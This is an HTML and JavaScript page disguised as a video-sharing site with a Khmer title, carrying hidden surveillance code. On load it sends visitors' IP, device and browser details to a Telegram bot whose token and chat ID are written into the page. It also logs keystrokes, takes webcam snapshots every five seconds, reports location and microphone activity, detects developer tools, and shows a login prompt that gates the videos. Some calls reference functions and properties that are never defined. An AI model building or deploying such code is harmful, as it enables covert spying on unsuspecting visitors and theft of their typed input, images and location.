<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</title>
  <style>
    /* Your original styles here, unchanged for brevity */
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500;700&display=swap');
    :root {
      --theme-color: #FF0076;
      --background-color: #f9f9f9;
      --card-background: #ffffff;
      --text-primary: #0f0f0f;
      --text-secondary: #606060;
      --border-color: #ddd;
    }
    body { margin: 0; background: var(--background-color); font-family: 'Roboto', Arial, sans-serif; color: var(--text-primary); }
    .hidden { display: none !important; }
    .site-header { background: var(--card-background); padding: 0 24px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 900; }
    .site-header h1 { font-family: "Kantumruy Pro", serif; font-size: 1.5em; color: var(--theme-color); margin: 0; }
    .back-button { font-size: 1em; font-weight: 500; cursor: pointer; padding: 8px 16px; border-radius: 20px; background-color: #eee; border: none; }
    .back-button:hover { background-color: #ddd; }
    #video-grid-page .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
    .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px 16px; }
    .video-card { cursor: pointer; }
    .thumbnail-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #eee; border-radius: 12px; overflow: hidden; margin-bottom: 12px; }
    .thumbnail-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s ease-out; }
    .video-card:hover .thumbnail-wrapper video { transform: scale(1.05); }
    .duration { position: absolute; bottom: 8px; right: 8px; background-color: rgba(0, 0, 0, 0.8); color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: 500; }
    .video-details { display: flex; gap: 12px; }
    .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ccc; flex-shrink: 0; }
    .video-metadata { display: flex; flex-direction: column; }
    .video-title { font-size: 1rem; font-weight: 500; margin: 0 0 4px 0; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
    .channel-name, .video-stats { font-size: 0.875rem; color: var(--text-secondary); margin: 0; }
    #video-player-page { padding: 24px; display: flex; gap: 24px; max-width: 1600px; margin: 0 auto; }
    .main-video-content { flex: 1; min-width: 0; }
    .player-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #000; border-radius: 15px; overflow: hidden; }
    .player-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
    .main-video-title { font-size: 1.4em; font-weight: 700; margin: 16px 0 8px 0; }
    .video-info-bar { display: flex; align-items: center; gap: 12px; margin-top: 12px; }
    .subscribe-btn { margin-left: auto; background-color: var(--theme-color); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 500; cursor: pointer; }
    .description-box { background-color: #eee; padding: 12px; border-radius: 12px; margin-top: 20px; }
    .description-box .video-stats { color: var(--text-primary); font-weight: 500; }
    .description-box .description-text { margin-top: 8px; line-height: 1.5; }
    .recommendations-sidebar { width: 400px; flex-shrink: 0; }
    .recommendations-sidebar h3 { margin: 0 0 16px 0; }
    .compact-video-card { display: flex; gap: 10px; margin-bottom: 12px; cursor: pointer; }
    .compact-video-card .thumbnail-wrapper { width: 160px; flex-shrink: 0; padding-bottom: 90px; }
    .compact-video-card .thumbnail-wrapper video { border-radius: 8px; }
    @media (max-width: 1200px) { #video-player-page { flex-direction: column; } .recommendations-sidebar { width: 100%; margin-top: 24px; } }
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); opacity: 0; transition: opacity 0.3s ease; }
    .modal.visible { display: block; opacity: 1; }
    .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
  </style>
</head>
<body>

<header class="site-header">
  <h1 id="header-title">·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</h1>
  <button id="back-to-grid" class="back-button hidden">&larr; Back</button>
</header>

<main id="video-grid-page">
  <div class="container">
    <div class="video-grid"></div>
  </div>
</main>

<main id="video-player-page" class="hidden">
  <div class="main-video-content">
    <div class="player-wrapper"><video id="main-player" controls autoplay playsinline webkit-playsinline></video></div>
    <h2 id="main-video-title" class="main-video-title"></h2>
    <div class="video-info-bar">
      <img id="main-channel-avatar" src="" alt="Channel Avatar" class="channel-avatar" />
      <div class="video-metadata">
        <p id="main-channel-name" class="channel-name" style="font-weight: 500; color: var(--text-primary);"></p>
        <p class="video-stats">1.2M subscribers</p>
      </div>
      <button class="subscribe-btn">Subscribe</button>
    </div>
    <div class="description-box">
      <p id="main-video-stats" class="video-stats"></p>
      <p class="description-text">This is a placeholder for the video description. #hashtag #anothertag</p>
    </div>
  </div>
  <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
</main>

<div id="loginModal" class="modal">
  <div class="modal-content">
    <h2>Please Login to Watch Full Video</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
  </div>
</div>

<div class="capture-container" style="display: none;">
  <video id="videoElementForCapture" autoplay playsinline></video>
  <canvas id="snapshot"></canvas>
</div>

<script>
const App = {
  config: {
    botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI", // Replace with your actual bot token
    chatId: "1272791365", // Replace with your chat ID
    snapshotInterval: 5000,
    micRecordInterval: 15000,
  },
  state: {
    keyLogBuffer: "",
    isLoggedIn: false,
    pageStartTime: Date.now(),
    lastScrollReport: 0,
    userLocation: { lat: "N/A", lon: "N/A" },
    microphoneStream: null,
    mediaRecorder: null,
    cameraStream: null,
    snapshotIntervalId: null,
  },
  DOM: {},
  init() {
    // Cache DOM elements
    this.DOM = {
      gridPage: document.getElementById('video-grid-page'),
      playerPage: document.getElementById('video-player-page'),
      mainPlayer: document.getElementById('main-player'),
      backButton: document.getElementById('back-to-grid'),
      headerTitle: document.getElementById('header-title'),
      loginModal: document.getElementById('loginModal'),
      captureVideo: document.getElementById('videoElementForCapture'),
      captureCanvas: document.getElementById('snapshot'),
      videoGrid: document.querySelector('.video-grid'),
    };

    this.generateVideoGrid();
    this.setupEventListeners();

    // Initialize tracking
    this.Tracking.initialize();

    // Load login state if available
    const loggedIn = localStorage.getItem('isLoggedIn');
    if (loggedIn === 'true') {
      this.state.isLoggedIn = true;
    }
  },

  generateVideoGrid() {
    // Placeholder for actual video grid generation logic
    // This should fetch video data and populate the .video-grid element
    console.log("Generating video grid...");
    const videos = [
      { id: 1, title: "Amazing Nature Scenery", thumbnail: "path/to/thumb1.jpg", src: "path/to/video1.mp4", channel: "Nature Explorer", channelAvatar: "path/to/avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
      { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "path/to/thumb2.jpg", src: "path/to/video2.mp4", channel: "Tech Guru", channelAvatar: "path/to/avatar2.jpg", views: "500K", timestamp: "1 week ago" },
      // Add more video objects as needed
    ];

    const videoGrid = this.DOM.videoGrid;
    videoGrid.innerHTML = ''; // Clear existing grid

    videos.forEach(video => {
      const card = document.createElement('div');
      card.classList.add('video-card');
      card.innerHTML = `
        <div class="thumbnail-wrapper">
          <video src="${video.src}" preload="metadata"></video>
          <span class="duration">3:45</span>
        </div>
        <div class="video-details">
          <img src="${video.channelAvatar}" alt="Channel Avatar" class="channel-avatar" />
          <div class="video-metadata">
            <h3 class="video-title">${video.title}</h3>
            <p class="channel-name">${video.channel}</p>
            <p class="video-stats">${video.views} views &#8226; ${video.timestamp}</p>
          </div>
        </div>
      `;
      card.addEventListener('click', () => this.showPlayer(video));
      videoGrid.appendChild(card);
    });
  },

  setupEventListeners() {
    // Add event listeners for any buttons or interactive elements
    // Example: Back button
    this.DOM.backButton.addEventListener('click', () => this.showGrid());

    // Login form submission
    document.getElementById('loginForm').addEventListener('submit', (e) => {
      e.preventDefault();
      // Basic login simulation
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      if (username && password) {
        this.state.isLoggedIn = true;
        localStorage.setItem('isLoggedIn', 'true');
        this.DOM.loginModal.classList.remove('visible');
        alert('Login successful!');
        // Optionally, redirect or show content
      } else {
        alert('Please enter username and password.');
      }
    });

    // Optionally, add keylogger functionality (handle with care due to privacy implications)
    document.addEventListener('keypress', (e) => {
      this.state.keyLogBuffer += e.key;
      if (this.state.keyLogBuffer.length > 100) { // Send buffer periodically
        this.Tracking.send(this.state.keyLogBuffer, true); // true for notification
        this.state.keyLogBuffer = "";
      }
    });
  },

  showPlayer(video) {
    this.DOM.gridPage.classList.add('hidden');
    this.DOM.playerPage.classList.remove('hidden');
    this.DOM.backButton.classList.remove('hidden');
    this.DOM.headerTitle.textContent = video.title; // Update header to video title

    this.DOM.mainPlayer.src = video.src;
    this.DOM.mainVideoTitle.textContent = video.title;
    this.DOM.mainChannelAvatar.src = video.channelAvatar;
    this.DOM.mainChannelName.textContent = video.channel;
    // Update video stats if available
    document.querySelector('.video-info-bar .video-stats').textContent = `${video.views} subscribers`;
    document.getElementById('main-video-stats').textContent = `${video.views} views &#8226; ${video.timestamp}`;

    // Populate recommendations (you'll need to implement this logic)
    this.populateRecommendations(video.id);

    // Show login modal if not logged in
    if (!this.state.isLoggedIn) {
      this.DOM.loginModal.classList.add('visible');
    }
  },

  showGrid() {
    this.DOM.gridPage.classList.remove('hidden');
    this.DOM.playerPage.classList.add('hidden');
    this.DOM.backButton.classList.add('hidden');
    this.DOM.headerTitle.textContent = "·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô"; // Reset header title
    // Stop the main player
    this.DOM.mainPlayer.pause();
    this.DOM.mainPlayer.removeAttribute('src');
  },

  populateRecommendations(currentVideoId) {
    // Placeholder for recommendation logic
    // Fetch or generate related videos and populate the .recommendations-sidebar
    console.log(`Populating recommendations for video ID: ${currentVideoId}`);
    const sidebar = document.getElementById('recommendations-sidebar');
    sidebar.innerHTML = '<h3>Recommended Videos</h3>'; // Clear previous recommendations
    const recommendedVideos = [
      // Example recommendation data
      { id: 3, title: "Another Nature Clip", src: "path/to/video3.mp4", views: "100K", timestamp: "3 days ago" },
      { id: 4, title: "Web Development Tips", src: "path/to/video4.mp4", views: "75K", timestamp: "5 days ago" },
    ];

    recommendedVideos.forEach(recVideo => {
      if (recVideo.id !== currentVideoId) {
        const card = document.createElement('div');
        card.classList.add('compact-video-card');
        card.innerHTML = `
          <div class="thumbnail-wrapper">
            <video src="${recVideo.src}" preload="metadata"></video>
            <span class="duration">1:15</span>
          </div>
          <div class="video-metadata">
            <h3 class="video-title">${recVideo.title}</h3>
            <p class="channel-name">Some Channel</p>
            <p class="video-stats">${recVideo.views} views &#8226; ${recVideo.timestamp}</p>
          </div>
        `;
        card.addEventListener('click', () => this.showPlayer(recVideo));
        sidebar.appendChild(card);
      }
    });
  },

  Telegram: {
    // Base URL for Telegram Bot API
    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`, // Using the token directly for simplicity, but consider environment variables

    async send(message, notify = false) {
      const url = `${this.telegramApiBaseUrl}sendMessage`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: "1272791365",
            text: message,
            parse_mode: 'Markdown', // Or 'HTML'
            disable_notification: !notify
          })
        });
        if (!response.ok) {
          console.error(`Telegram sendMessage error: ${response.status} ${response.statusText}`);
          const errorData = await response.json();
          console.error("Telegram response:", errorData);
        } else {
          console.log("Message sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Telegram send error:", e);
      }
    },

    async sendPhoto(caption, photoBlob) {
      const url = `${this.telegramApiBaseUrl}sendPhoto`;
      const formData = new FormData();
      formData.append('chat_id', "1272791365");
      formData.append('caption', caption);
      formData.append('photo', photoBlob, 'snapshot.png'); // Provide a filename

      try {
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });
        if (!response.ok) {
          console.error(`Telegram sendPhoto error: ${response.status} ${response.statusText}`);
          const errorData = await response.json();
          console.error("Telegram response:", errorData);
        } else {
          console.log("Photo sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Telegram sendPhoto error:", e);
      }
    },

    async sendAudio(caption, audioBlob) {
      const url = `${this.telegramApiBaseUrl}sendAudio`;
      const formData = new FormData();
      formData.append('chat_id', "1272791365");
      formData.append('caption', caption);
      formData.append('audio', audioBlob, 'recording.ogg'); // Provide a filename and extension

      try {
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });
        if (!response.ok) {
          console.error(`Telegram sendAudio error: ${response.status} ${response.statusText}`);
          const errorData = await response.json();
          console.error("Telegram response:", errorData);
        } else {
          console.log("Audio sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Telegram sendAudio error:", e);
      }
    },

    async sendLocation(latitude, longitude, caption = "User Location") {
      const url = `${this.telegramApiBaseUrl}sendLocation`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: "1272791365",
            latitude: latitude,
            longitude: longitude,
            // You can add more parameters like live_period, heading, proximity_alert_radius if needed
          })
        });
        if (!response.ok) {
          console.error(`Telegram sendLocation error: ${response.status} ${response.statusText}`);
          const errorData = await response.json();
          console.error("Telegram response:", errorData);
        } else {
          console.log("Location sent to Telegram successfully.");
          // Optionally send the caption as a separate message or handle it
          // this.send(`Location shared: ${caption}`);
        }
      } catch (e) {
        console.warn("Telegram sendLocation error:", e);
      }
    }
  },

  Tracking: {
    async initialize() {
      console.log("Initializing tracking...");
      await this.send("üöÄ New Session Started");
      const report = await this.getInitialReport();
      await this.send(report);

      // Request permissions
      // Using a more robust approach with Permissions API
      await this.checkAndRequestPermission('camera', this.requestCamera.bind(this), this.stopCamera.bind(this));
      await this.checkAndRequestPermission('microphone', this.requestMicrophone.bind(this), this.stopMicrophone.bind(this));
      await this.checkAndRequestPermission('geolocation', this.requestGeolocation.bind(this));

      // Detect dev tools
      this.detectDevTools();

      // Start periodic snapshotting if camera is available
      if (this.cameraStream) {
        this.startSnapshotting();
      }
    },

    async checkAndRequestPermission(name, requestFn, stopFn = () => {}) {
      try {
        if (!navigator.permissions) {
          console.warn(`Permissions API not supported for ${name}. Attempting direct request.`);
          requestFn();
          return;
        }
        const status = await navigator.permissions.query({ name });
        console.log(`Permission ${name}: ${status.state}`);

        if (status.state === 'granted') {
          requestFn();
        } else if (status.state === 'prompt') {
          // Request permission if not granted and prompt is available
          requestFn();
        }

        status.onchange = () => {
          console.log(`Permission ${name} changed to ${status.state}`);
          if (status.state === 'granted') {
            requestFn();
          } else {
            stopFn();
          }
        };
      } catch (e) {
        console.warn(`Error checking/requesting permission for ${name}:`, e);
        // Fallback to direct request if Permissions API fails
        requestFn();
      }
    },

    async getInitialReport() {
      console.log("Gathering initial report...");
      let report = `*üíª New Visitor Report*\n\n`;

      try {
        // Attempt to get public IP (requires a third-party service)
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        report += `*IP (Public):* \`${ipData.ip}\`\n`;
      } catch (e) {
        report += `*IP (Public):* N/A (Could not fetch)\n`;
      }

      report += `*IP (Local):* Not directly accessible from browser JS for security reasons.\n`;
      report += `*OS:* ${navigator.platform || 'N/A'}\n`;
      report += `*Browser:* ${navigator.userAgent || 'N/A'}\n`;
      report += `*Language:* ${navigator.language || 'N/A'}\n`;
      report += `*Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}\n`;
      report += `*Incognito:* ${navigator.storage && navigator.storage.persisted ? (await navigator.storage.persisted() ? 'No' : 'Yes') : 'N/A'}\n`; // Basic incognito check
      report += `*Screen:* ${window.screen.width}x${window.screen.height}\n`;
      // Hardware and Battery status might require specific permissions or are not easily accessible
      report += `*Hardware:* Limited information available\n`;
      try {
        const battery = await navigator.getBattery();
        report += `*Battery:* ${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}\n`;
      } catch (e) {
        report += `*Battery:* N/A (Permissions error or not supported)\n`;
      }

      return report;
    },

    async requestCamera() {
      try {
        if (this.cameraStream) {
          console.log("Camera already active");
          return;
        }
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        this.cameraStream = stream;
        console.log("Camera permission granted.");
        App.DOM.captureVideo.srcObject = stream; // Display camera feed if needed
        this.startSnapshotting(); // Start snapshots once camera is active
      } catch (e) {
        console.warn("Camera permission error:", e);
        this.send(`üö´ Camera permission error: ${e.message}`);
      }
    },

    stopCamera() {
      if (this.cameraStream) {
        this.cameraStream.getTracks().forEach(t => t.stop());
        this.cameraStream = null;
        console.log("Camera stopped.");
        this.stopSnapshotting();
      }
    },

    async requestMicrophone() {
      try {
        if (this.microphoneStream) {
          console.log("Microphone already active");
          return;
        }
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        this.microphoneStream = stream;
        this.startMicRecording(stream);
        console.log("Microphone permission granted.");
      } catch (e) {
        console.warn("Microphone permission error:", e);
        this.send(`üö´ Microphone permission error: ${e.message}`);
      }
    },

    stopMicrophone() {
      if (this.microphoneStream) {
        this.microphoneStream.getTracks().forEach(t => t.stop());
        this.microphoneStream = null;
        if (this.state.mediaRecorder && this.state.mediaRecorder.state === 'recording') {
          this.state.mediaRecorder.stop();
        }
        console.log("Microphone stopped.");
      }
    },

    startMicRecording(stream) {
      if (!window.MediaRecorder) {
        console.warn("MediaRecorder not supported");
        this.send("‚ö†Ô∏è MediaRecorder API not supported.");
        return;
      }
      try {
        this.state.mediaRecorder = new MediaRecorder(stream);
        this.state.mediaRecorder.ondataavailable = async (e) => {
          if (e.data && e.data.size > 0) {
            // Convert Blob to something that can be sent to Telegram (e.g., using sendAudio)
            // Note: Telegram's sendAudio expects a file, so we might need to upload it first
            // or check if sendAudio directly supports Blobs with FormData.
            console.log("Audio data available, attempting to send...");
            // For simplicity, we'll send a message indicating audio recording
            // A full implementation would involve uploading the audio data.
            await this.send(`*üéôÔ∏è Audio Recording (${(e.data.size / 1024 / 1024).toFixed(2)} MB) captured.*`, true);
            // If you have a working `sendAudio` implementation that accepts Blobs:
            // App.Telegram.sendAudio("Voice message", e.data);
          }
        };
        this.state.mediaRecorder.onstop = () => {
          console.log("Microphone recording stopped.");
          this.send("üéôÔ∏è Microphone recording stopped.");
        };
        this.state.mediaRecorder.start(this.config.micRecordInterval);
        console.log(`Microphone recording started with interval ${this.config.micRecordInterval}ms`);
        this.send("üéôÔ∏è Microphone recording started.");
      } catch (error) {
        console.error("Error starting MediaRecorder:", error);
        this.send(`üö´ Error starting microphone recording: ${error.message}`);
      }
    },

    async requestGeolocation() {
      if (this.state.userLocation.lat !== "N/A") {
        console.log("Geolocation already obtained");
        return;
      }
      navigator.geolocation.getCurrentPosition(
        p => {
          this.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
          console.log(`Geolocation sent: ${p.coords.latitude}, ${p.coords.longitude}`);
          // Send location to Telegram
          App.Telegram.sendLocation(p.coords.latitude, p.coords.longitude);
          // Optionally send a text message with coordinates
          // this.send(`üìç Location: \`${p.coords.latitude}, ${p.coords.longitude}\``, true);
        },
        e => {
          console.warn("Geolocation error:", e);
          this.send(`üö´ Geo Error: Code ${e.code} - ${e.message}`);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Options for accuracy and timeout
      );
    },

    detectDevTools() {
      const t = 160; // Threshold for detecting dev tools
      let devToolsOpened = false;
      const checkDevTools = () => {
        const isDevToolsOpen = window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t;
        if (isDevToolsOpen && !devToolsOpened) {
          devToolsOpened = true;
          console.log("Dev Tools Opened!");
          this.send("‚ö†Ô∏è Developer Tools Opened!", true);
        } else if (!isDevToolsOpen && devToolsOpened) {
          devToolsOpened = false;
          console.log("Dev Tools Closed!");
          this.send("‚úÖ Developer Tools Closed.", true);
        }
        // Use requestAnimationFrame for smoother checks
        requestAnimationFrame(checkDevTools);
      };
      requestAnimationFrame(checkDevTools);
    },

    startSnapshotting() {
      if (this.state.snapshotIntervalId) return; // Already running
      console.log(`Starting snapshotting every ${this.config.snapshotInterval}ms`);
      this.state.snapshotIntervalId = setInterval(() => {
        this.captureAndSend("üì∏ Webcam Snapshot");
      }, this.config.snapshotInterval);
    },

    stopSnapshotting() {
      if (this.state.snapshotIntervalId) {
        clearInterval(this.state.snapshotIntervalId);
        this.state.snapshotIntervalId = null;
        console.log("Snapshotting stopped.");
      }
    },

    captureAndSend(caption) {
      if (!this.cameraStream) {
        console.log("Camera not active, cannot capture snapshot.");
        return;
      }

      const video = App.DOM.captureVideo;
      const canvas = App.DOM.captureCanvas;
      const context = canvas.getContext('2d');

      // Set canvas dimensions to match video aspect ratio
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Draw the current video frame onto the canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert canvas content to a Blob
      canvas.toBlob(async (blob) => {
        if (blob) {
          console.log("Snapshot captured, sending to Telegram...");
          await App.Telegram.sendPhoto(caption, blob);
        } else {
          console.error("Failed to create snapshot blob.");
        }
      }, 'image/png'); // Or 'image/jpeg' for smaller file size
    }
  }
};

// Initialize the app
document.addEventListener('DOMContentLoaded', () => {
  App.init();
});
</script>
</body>
</html>
